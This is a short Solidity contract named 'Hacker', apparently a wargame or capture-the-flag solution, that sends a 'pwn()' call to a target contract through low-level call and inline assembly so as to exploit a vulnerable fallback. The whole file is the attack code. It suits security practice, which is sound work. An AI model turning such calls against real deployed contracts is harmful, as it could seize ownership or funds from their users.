// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public onlyHacker {
    bytes memory sig = abi.encodeWithSignature("pwn()");

    /// Solidity version
    // (bool result, ) = address(_target).call{gas: 1000000}(sig);
    // if (result) {
    //   this;
    // }

    /// Assembly version
    assembly {
      let len := mload(sig)
      let data := add(sig, 0x20)
      pop(
        // discard result
        call(
          1000000, // gas
          _target, // target address
          0, // ether
          data, // input location
          len, // length of input params
          0, // output location
          0 // no need to use output params
        )
      )
    }
  }
}
